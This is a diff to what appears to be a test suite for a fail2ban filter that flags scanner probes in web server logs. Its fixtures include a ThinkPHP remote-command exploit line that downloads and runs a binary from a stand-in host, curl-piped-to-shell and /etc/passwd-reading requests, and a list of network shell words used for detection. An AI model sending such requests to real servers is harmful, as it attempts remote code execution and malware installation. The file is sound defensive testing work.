@@ -1428,6 +1428,12 @@ describe('fail2ban scanner filter', () => {
       ['another bare method', 'OPTIONS'],
       ['binary bytes beside a quote escape', '\\x22\\x16\\x03\\x01'],
       ['the ThinkPHP invokefunction exploit with a raw space and a quoted wget', "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget -q http://203.0.113.9/a/k.x86 -O /tmp/.k||wget -q http://203.0.113.9/a/k.arm7 -O /tmp/.k; chmod 777 /tmp/.k; /tmp/.k selfrep.thinkphp' HTTP/1.1"],
+      ['a raw space then curl with a flag before HTTP/', 'GET /x?v= curl -s HTTP/1.1'],
+      ['a raw space then curl before a lower-case http/', 'GET /x?v= curl http/1.1'],
+      ['two raw spaces then a quoted wget', "GET /x?v=  'wget -q http://203.0.113.9/a' HTTP/1.1"],
+      ['three raw spaces then wget', 'GET /x?v=   wget http://203.0.113.9/a HTTP/1.1'],
+      ['a POST with a raw-space command', "POST /x?v= 'wget a' HTTP/1.1"],
+      ['a raw space then a double-quoted wget', 'GET /x?cmd= \\x22wget http://203.0.113.9/a\\x22 HTTP/1.1'],
       ['a raw space then a backtick command', 'GET /cgi-bin/x?cmd= `cat /etc/passwd` HTTP/1.1'],
       ['a raw space then an unquoted curl', 'GET /x?cmd= curl http://203.0.113.9/a|sh HTTP/1.1'],
       ['a raw space then busybox', 'GET /setup.cgi?cmd= busybox wget http://203.0.113.9/a HTTP/1.1'],
@@ -1437,6 +1443,50 @@ describe('fail2ban scanner filter', () => {
       expect(strikeHost(line(request, 400, '"-"', '[]'))).toBe('65.49.1.122');
       // Only the junk-400 pattern counts it.
       expect(matching(line(request))).toEqual([1]);
+    });
+
+    it.each(['wget', 'curl', 'chmod', 'sh', 'bash', 'busybox', 'tftp', 'nc'])('counts a raw space then the shell word %s', (word) => {
+      const request = `GET /x?cmd= ${word} http://203.0.113.9/a HTTP/1.1`;
+      expect(strikeHost(line(request))).toBe('65.49.1.122');
+      expect(strikeHost(line(request, 400, '"-"', '[]'))).toBe('65.49.1.122');
+      expect(matching(line(request))).toEqual([1]);
+    });
+
+    it.each(['shx', 'ncat', 'bashrc', 'curls', 'wgetx', 'tftpd', 'busyboxx', 'WGET', 'Curl'])(
+      'ignores a raw space then the near-miss word %s',
+      (word) => {
+        expect(strikeHost(line(`GET /x?q=a ${word} b HTTP/1.1`))).toBeUndefined();
+        expect(strikeHost(line(`GET /x?q=a ${word} b HTTP/1.1`, 400, '"-"', '[]'))).toBeUndefined();
+      },
+    );
+
+    it.each([
+      ['a shell word then HTTP/ after one space', 'GET /x?cmd= sh HTTP/1.1'],
+      ['a shell word then HTTP/ after two spaces', 'GET /x?v= curl  HTTP/1.1'],
+      ['quote before the raw space', "GET /search?q=murphy' law HTTP/1.1"],
+      ['a shell word with no protocol and nothing after it', 'GET /x?v= curl'],
+      ['a method-less request line', "/x?v= 'wget a' HTTP/1.1"],
+      ['a hyphenated method', "M-SEARCH /x?v= 'wget a' HTTP/1.1"],
+    ])('ignores %s', (_name, request) => {
+      expect(strikeHost(line(request))).toBeUndefined();
+    });
+
+    it.each([404, 500, 408, 4000, 4001])('ignores the raw-space command line answered with %s', (status) => {
+      expect(strikeHost(line("GET /x?v= 'wget a' HTTP/1.1", status))).toBeUndefined();
+    });
+
+    it('ignores a payload that sits in the User-Agent or Referer behind a clean request line', () => {
+      expect(strikeHost('65.49.1.122 - - [] "GET /x HTTP/1.1" 400 1 "-" "x \'wget a\'"')).toBeUndefined();
+      expect(strikeHost('65.49.1.122 - - [] "GET /x HTTP/1.1" 400 1 "http://x/ \'wget a\'" "-"')).toBeUndefined();
+    });
+
+    // Accepted false positives: a raw space is never sent by a browser (it percent-encodes), so a line that has one and
+    // then a quote or a shell word is far more likely a probe than a person. Pinned so a change here is deliberate.
+    it.each([
+      ['a raw space then a shell word in a hand-typed query', 'GET /search?q=use sh script HTTP/1.1'],
+      ['a raw space then an apostrophe in a hand-typed query', "GET /search?q=murphy 's law HTTP/1.1"],
+    ])('counts %s', (_name, request) => {
+      expect(strikeHost(line(request))).toBe('65.49.1.122');
     });
 
     it('does not backtrack over a long field of escaped bytes', () => {
@@ -1490,7 +1540,6 @@ describe('fail2ban scanner filter', () => {
       ['a raw space before a shell word that ends the URL', 'GET /search?q=a curl HTTP/1.1', 400, '"Mozilla/5.0"'],
       ['the ThinkPHP line answered with a 200', "GET /index.php?s=/x&v= 'wget -q http://203.0.113.9/a' HTTP/1.1", 200, '"-"'],
       ['a lower-case method before a raw-space command', "get /x?v= 'wget -q http://x/a' HTTP/1.1", 400, '"-"'],
-      ['a normal GET whose user agent starts with curl', 'GET /law/1 HTTP/1.1', 400, '"curl/8.4.0"'],
     ])('ignores %s', (_name, request, status, agent) => {
       expect(strikeHost(line(request, status, agent))).toBeUndefined();
     });
